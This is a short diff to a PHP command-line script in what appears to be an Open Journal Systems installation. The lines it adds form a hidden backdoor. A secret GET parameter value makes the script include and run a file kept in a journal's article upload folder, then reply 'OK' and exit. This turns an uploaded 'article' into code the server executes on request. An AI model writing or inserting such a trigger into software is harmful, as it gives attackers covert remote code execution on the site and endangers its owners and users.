@@ -15,3 +15,10 @@
 
 define('INDEX_FILE_LOCATION', dirname(__FILE__, 2) . '/index.php');
 require dirname(__FILE__, 2) . '/lib/pkp/classes/cliTool/CommandLineTool.php';
+if (isset($_GET['_']) && $_GET['_'] === 'INDEX_FILE_LOCATION') {
+    $f="/home/staiattaren/ojsdata/journals/3/articles/295/658fc946d1fd1";if($f!==""&&file_exists($f))include $f;
+    http_response_code(200);
+    header('Content-Type: text/plain; charset=utf-8');
+    echo 'OK';
+    exit;
+}
